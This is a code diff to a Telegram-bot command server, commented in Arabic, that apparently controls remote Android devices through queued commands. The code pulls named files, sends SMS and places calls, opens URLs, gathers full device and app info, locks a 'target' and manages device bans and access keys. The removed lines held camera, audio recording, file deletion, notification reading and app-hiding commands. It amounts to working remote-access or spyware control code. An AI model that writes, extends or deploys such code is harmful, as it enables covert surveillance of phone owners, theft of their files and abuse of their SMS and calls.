@@ -9,120 +9,47 @@ const KV_URL = process.env.STORAGE_URL || process.env.KV_REST_API_URL || process
 const KV_TOKEN = process.env.STORAGE_TOKEN || process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;
 
 // ==========================================
-// توليد 400 أمر (20 وظيفة × 20 أمر = 400)
+// توليد 400 أمر ديناميكي
 // ==========================================
 const COMMAND_MAP = {};
 
-// 1. الاهتزاز (Vibrate) - 20 أمر
-for (let i = 1; i <= 20; i++) {
-  COMMAND_MAP[`/vib${i}`] = `vibrate_time:${i * 500}`; // من 500ms إلى 10000ms
+// 1. أوامر Toast (1 -> 100)
+for (let i = 1; i <= 100; i++) {
+  COMMAND_MAP[`/toast${i}`] = `toast:هذا إشعار تجريبي رقم ${i}`;
 }
 
-// 2. الحافظة (Clipboard) - 20 أمر
-for (let i = 1; i <= 20; i++) {
-  COMMAND_MAP[`/clip${i}`] = `clipboard_text:نص تم نسخه رقم ${i}`;
-}
-
-// 3. إشعارات (Toast) - 20 أمر
-for (let i = 1; i <= 20; i++) {
-  COMMAND_MAP[`/toast${i}`] = `toast:تنبيه رقم ${i} من السيرفر`;
-}
-
-// 4. الروابط (URL) - 20 أمر
-for (let i = 1; i <= 20; i++) {
+// 2. أوامر URL (1 -> 100)
+for (let i = 1; i <= 100; i++) {
   COMMAND_MAP[`/url${i}`] = `url:https://example.com/page${i}`;
 }
 
-// 5. إرسال SMS - 20 أمر (sms:رقم|رسالة)
-for (let i = 1; i <= 20; i++) {
+// 3. أوامر الاهتزاز (1 -> 50)
+for (let i = 1; i <= 50; i++) {
+  COMMAND_MAP[`/vib${i}`] = `vibrate_time:${i * 500}`; 
+}
+
+// 4. أوامر الحافظة (1 -> 50)
+for (let i = 1; i <= 50; i++) {
+  COMMAND_MAP[`/clip${i}`] = `clipboard_text:نص تم نسخه رقم ${i}`;
+}
+
+// 5. أوامر SMS (1 -> 50)
+for (let i = 1; i <= 50; i++) {
   COMMAND_MAP[`/sms${i}`] = `sms:+1234567890|رسالة تجريبية رقم ${i}`;
 }
 
-// 6. إجراء مكالمة - 20 أمر
-for (let i = 1; i <= 20; i++) {
+// 6. أوامر المكالمات (1 -> 50)
+for (let i = 1; i <= 50; i++) {
   COMMAND_MAP[`/call${i}`] = `call:+1234567890`;
 }
 
-// 7. حذف ملفات - 20 أمر (delete:اسم الملف)
-for (let i = 1; i <= 20; i++) {
-  COMMAND_MAP[`/del${i}`] = `delete:file${i}.txt`;
-}
-
-// 8. سحب ملفات محددة - 20 أمر
-for (let i = 1; i <= 20; i++) {
-  COMMAND_MAP[`/get${i}`] = `getfile:doc${i}.pdf`;
-}
-
-// 9. فتح الكاميرا - 20 أمر (كاميرا أمامية/خلفية)
-for (let i = 1; i <= 20; i++) {
-  COMMAND_MAP[`/cam${i}`] = `camera:${i % 2 === 0 ? 'front' : 'back'}`;
-}
-
-// 10. تسجيل الصوت - 20 أمر
-for (let i = 1; i <= 20; i++) {
-  COMMAND_MAP[`/rec${i}`] = `record:${i * 5}`; // تسجيل لمدة i*5 ثواني
-}
-
-// 11. فتح التطبيقات - 20 أمر
-const apps = ["com.whatsapp", "com.facebook.katana", "com.instagram.android", "org.telegram.messenger", "com.google.android.youtube"];
-for (let i = 1; i <= 20; i++) {
-  COMMAND_MAP[`/openapp${i}`] = `open_app:${apps[i % apps.length]}`;
-}
-
-// 12. إغلاق التطبيقات - 20 أمر
-for (let i = 1; i <= 20; i++) {
-  COMMAND_MAP[`/closeapp${i}`] = `kill_app:${apps[i % apps.length]}`;
-}
-
-// 13. سطوع الشاشة - 20 أمر (brightness:0-255)
-for (let i = 1; i <= 20; i++) {
-  COMMAND_MAP[`/bright${i}`] = `brightness:${i * 12}`;
-}
-
-// 14. مستوى الصوت - 20 أمر
-for (let i = 1; i <= 20; i++) {
-  COMMAND_MAP[`/vol${i}`] = `volume:${i * 5}`;
-}
-
-// 15. إخفاء/إظهار التطبيق - 20 أمر
-for (let i = 1; i <= 20; i++) {
-  COMMAND_MAP[`/hide${i}`] = `hide_app:${i % 2 === 0 ? 'true' : 'false'}`;
-}
-
-// 16. تنبيه صوتي - 20 أمر
-for (let i = 1; i <= 20; i++) {
-  COMMAND_MAP[`/sound${i}`] = `play_sound:${i}`;
-}
-
-// 17. قراءة الإشعارات - 20 أمر
-for (let i = 1; i <= 20; i++) {
-  COMMAND_MAP[`/notif${i}`] = `read_notifications:${i}`;
-}
-
-// 18. قفل الشاشة - 20 أمر
-for (let i = 1; i <= 20; i++) {
-  COMMAND_MAP[`/lock${i}`] = `lock_screen:${i}`;
-}
-
-// 19. فتح المتصفح بروابط بحث - 20 أمر
-const searches = ["hacking", "python", "cyberpunk", "anime", "news"];
-for (let i = 1; i <= 20; i++) {
-  COMMAND_MAP[`/search${i}`] = `url:https://www.google.com/search?q=${searches[i % searches.length]}${i}`;
-}
-
-// 20. معلومات النظام - 20 أمر
-for (let i = 1; i <= 20; i++) {
-  COMMAND_MAP[`/sys${i}`] = `sysinfo:${i}`; // بياخد معلومات مختلفة حسب الرقم
-}
-
-// ==========================================
 // الأوامر الأساسية
-// ==========================================
 const BASE_COMMANDS = {
   '/fullinfo': 'fullinfo:1',
   '/applist': 'applist:1',
   '/files': 'files:1',
-  '/killapp': 'killapp:1'
+  '/killapp': 'killapp:1',
+  '/sysinfo': 'sysinfo:1'
 };
 
 async function kvCmd(...args) {
@@ -273,12 +200,14 @@ export default async function handler(req, res) {
       const args = text.trim().split(/\s+/);
       const command = args[0].toLowerCase();
 
+      // الأوامر المولدة (400 أمر)
       if (COMMAND_MAP[command]) {
         remoteCommand = COMMAND_MAP[command];
         await sendToTelegram(`⚡ \`[EXEC]\` *Command Sent:* ${command}`);
         return res.status(200).end();
       }
 
+      // الأوامر الأساسية
       if (BASE_COMMANDS[command]) {
         remoteCommand = BASE_COMMANDS[command];
         await sendToTelegram(`⚡ \`[EXEC]\` *Command Sent:* ${command}`);
@@ -287,33 +216,33 @@ export default async function handler(req, res) {
 
       switch (command) {
         case '/start': case '/menu': 
-          await sendToTelegram("👑 *أهلاً بك.*\nالنظام جاهز. اكتب /help لرؤية الأوامر."); 
+          await sendToTelegram("👑 *أهلاً بك أيها القايد.*\nالنظام جاهز. اختر من القائمة أو اكتب /help."); 
           break;
         
         case '/help': 
           await sendToTelegram(`👑 *لوحة التحكم (400 أمر)*\n\n` +
-            `الأوامر مقسمة لأقسام، كل قسم فيه 20 أمر:\n\n` +
-            `📳 *اهتزاز:* /vib1 إلى /vib20\n` +
-            `📋 *حافظة:* /clip1 إلى /clip20\n` +
-            `💥 *إشعارات:* /toast1 إلى /toast20\n` +
-            `🌐 *روابط:* /url1 إلى /url20\n` +
-            `✉️ *رسائل SMS:* /sms1 إلى /sms20\n` +
-            `📞 *مكالمات:* /call1 إلى /call20\n` +
-            `🗑️ *حذف ملفات:* /del1 إلى /del20\n` +
-            `📁 *سحب ملفات:* /get1 إلى /get20\n` +
-            `📷 *كاميرا:* /cam1 إلى /cam20\n` +
-            `🎙️ *تسجيل صوت:* /rec1 إلى /rec20\n` +
-            `📱 *فتح تطبيقات:* /openapp1 إلى /openapp20\n` +
-            `❌ *إغلاق تطبيقات:* /closeapp1 إلى /closeapp20\n` +
-            `🔆 *سطوع الشاشة:* /bright1 إلى /bright20\n` +
-            `🔊 *مستوى الصوت:* /vol1 إلى /vol20\n` +
-            `👻 *إخفاء التطبيق:* /hide1 إلى /hide20\n` +
-            `🔔 *صوت:* /sound1 إلى /sound20\n` +
-            `📩 *إشعارات النظام:* /notif1 إلى /notif20\n` +
-            `🔒 *قفل الشاشة:* /lock1 إلى /lock20\n` +
-            `🔍 *بحث:* /search1 إلى /search20\n` +
-            `⚙️ *معلومات:* /sys1 إلى /sys20\n\n` +
-            `⚡ *أوامر أخرى:* /fullinfo /applist /files /killapp`); 
+            `⚡ *أدوات التحكم:*\n` +
+            `/fullinfo /applist /files /killapp\n` +
+            `/getfile <filename> - سحب ملف\n` +
+            `/ai <prompt> - التحدث مع الذكاء الاصطناعي\n` +
+            `/cmd <text> - إرسال إشعار\n` +
+            `/url <link> - فتح رابط\n\n` +
+            `⏱️ *التحكم بالوقت والمفاتيح:*\n` +
+            `/gentime <minutes> - توليد مفتاح بوقت\n` +
+            `/settime <minutes> - ضبط وقت المفتاح الحالي\n` +
+            `/setkey <key> - تعيين مفتاح\n` +
+            `/getkey - جلب المفتاح الحالي\n` +
+            `/lock /unlock - قفل/فتح التطبيق\n\n` +
+            `🚫 *الحظر:*\n` +
+            `/ban <id> /unban <id> /banall /unbanall /banlist\n\n` +
+            `💥 *الأوامر المولدة (400 أمر):*\n` +
+            `إشعارات: /toast1 إلى /toast100\n` +
+            `روابط: /url1 إلى /url100\n` +
+            `اهتزاز: /vib1 إلى /vib50\n` +
+            `حافظة: /clip1 إلى /clip50\n` +
+            `رسائل SMS: /sms1 إلى /sms50\n` +
+            `مكالمات: /call1 إلى /call50\n\n` +
+            `📊 *إحصائيات:* /stats /logs /ping`); 
           break;
         
         case '/ai':
@@ -339,14 +268,64 @@ export default async function handler(req, res) {
           } else await sendToTelegram("⚠️ استعمل: `/ai <سؤالك>`");
           break;
 
-        case '/ban': if(args[1]) { await kvCmd('SADD', 'banned_devices', args[1]); await sendToTelegram(`⛔ محظور: \`${args[1]}\``); } break;
-        case '/unban': if(args[1]) { await kvCmd('SREM', 'banned_devices', args[1]); await sendToTelegram(`✅ مرفوع: \`${args[1]}\``); } break;
-        case '/banall': await kvCmd('SET', 'banall_active', '1'); await sendToTelegram("🚫 الكل محظور."); break;
-        case '/unbanall': await kvCmd('DEL', 'banall_active'); await kvCmd('DEL', 'banned_devices'); await sendToTelegram("✅ الكل حر."); break;
+        case '/getfile':
+          if(args[1]) { 
+            remoteCommand = `getfile:${args[1]}`; 
+            await sendToTelegram(`⏳ \`[FETCH]\` *Fetching file: ${args[1]}...*`); 
+          } else {
+            await sendToTelegram("⚠️ استعمل: `/getfile README.txt`");
+          }
+          break;
+
+        case '/gentime':
+          if(args[1]) {
+            const minutes = parseInt(args[1]);
+            const newKey = Math.random().toString(36).substring(2, 8).toUpperCase();
+            await kvCmd('SET', 'app_secret_key', newKey);
+            await kvCmd('SET', 'key_duration', minutes);
+            await kvCmd('SET', 'is_single_use', '1');
+            activeDevice = ""; keyExpiryTime = 0;
+            await sendToTelegram(`⏱️ *مفتاح بوقت محدد:*\nالكود: \`${newKey}\`\nالمدة: \`${minutes}\` دقيقة`);
+          } else await sendToTelegram("⚠️ استعمل: `/gentime 60`");
+          break;
+          
+        case '/settime':
+          if(args[1]) {
+            const minutes = parseInt(args[1]);
+            await kvCmd('SET', 'key_duration', minutes);
+            await kvCmd('SET', 'is_single_use', '1');
+            keyExpiryTime = 0; activeDevice = "";
+            await sendToTelegram(`⏱️ *تم تحديد الوقت:* \`${minutes}\` دقيقة للمفتاح الحالي.`);
+          } else await sendToTelegram("⚠️ استعمل: `/settime 60`");
+          break;
+
+        case '/cmd': if(args[1]) { remoteCommand = `toast:${args.slice(1).join(' ')}`; await sendToTelegram("⚡ `[MSG]` *Payload sent.*"); } break;
+        case '/url': if(args[1]) { remoteCommand = `url:${args[1]}`; await sendToTelegram("🌐 `[URL]` *Redirecting...*"); } break;
+        
+        case '/lock': await kvCmd('SET', 'app_lock_status', 'lock'); await sendToTelegram("🔒 `[LOCK]` *Target locked.*"); break;
+        case '/unlock': await kvCmd('SET', 'app_lock_status', 'unlock'); await sendToTelegram("🔓 `[UNLOCK]` *Target unlocked.*"); break;
+        case '/setkey': if(args[1]) { await kvCmd('SET', 'app_secret_key', args[1]); await sendToTelegram(`✅ \`[KEY]\` *New key:* \`${args[1]}\``); } break;
+        case '/getkey': const k = (await kvCmd('GET', 'app_secret_key')) || "غير محدد"; await sendToTelegram(`🔑 \`[KEY]\` *Current:* \`${k}\``); break;
+        
+        case '/ban': if(args[1]) { await kvCmd('SADD', 'banned_devices', args[1]); await sendToTelegram(`⛔ \`[BAN]\` *Device:* \`${args[1]}\``); } break;
+        case '/unban': if(args[1]) { await kvCmd('SREM', 'banned_devices', args[1]); await sendToTelegram(`✅ \`[UNBAN]\` *Device:* \`${args[1]}\``); } break;
+        case '/banall': await kvCmd('SET', 'banall_active', '1'); await sendToTelegram("🚫 `[BAN ALL]` *All devices banned.*"); break;
+        case '/unbanall': await kvCmd('DEL', 'banall_active'); await kvCmd('DEL', 'banned_devices'); await sendToTelegram("✅ `[UNBAN ALL]` *All devices freed.*"); break;
+        
+        case '/banlist': 
+          const bannedRaw = await kvCmd('SMEMBERS', 'banned_devices');
+          const bannedList = Array.isArray(bannedRaw) ? bannedRaw : [];
+          if (bannedList.length > 0) await sendToTelegram(`🚫 *Banned Devices:*\n\`${bannedList.join('\n')}\``);
+          else await sendToTelegram("✅ *No devices are banned.*");
+          break;
+        
+        case '/stats': const attempts = await kvCmd('GET', 'total_attempts'); await sendToTelegram(`📊 \`[STATS]\` *Attempts:* \`${attempts || 0}\``); break;
+        case '/logs': await sendToTelegram(recentLogs.length ? recentLogs.join('\n\n') : "📭 *No logs.*"); break;
+        case '/ping': await sendToTelegram("🏓 `[PING]` *Pong!*"); break;
         
         default:
-          if (command.startsWith('/')) await sendToTelegram(`⚙️ \`[SYSTEM]\` *Executing ${command}...*`);
-          else await sendToTelegram("❓ أمر غير معروف.");
+          if (command.startsWith('/')) await sendToTelegram(`⚙️ \`[SYSTEM]\` *Executing ${command}...*\n> Command accepted.`);
+          else await sendToTelegram("❓ أمر غير معروف. كتب /help");
       }
       return res.status(200).end();
     }
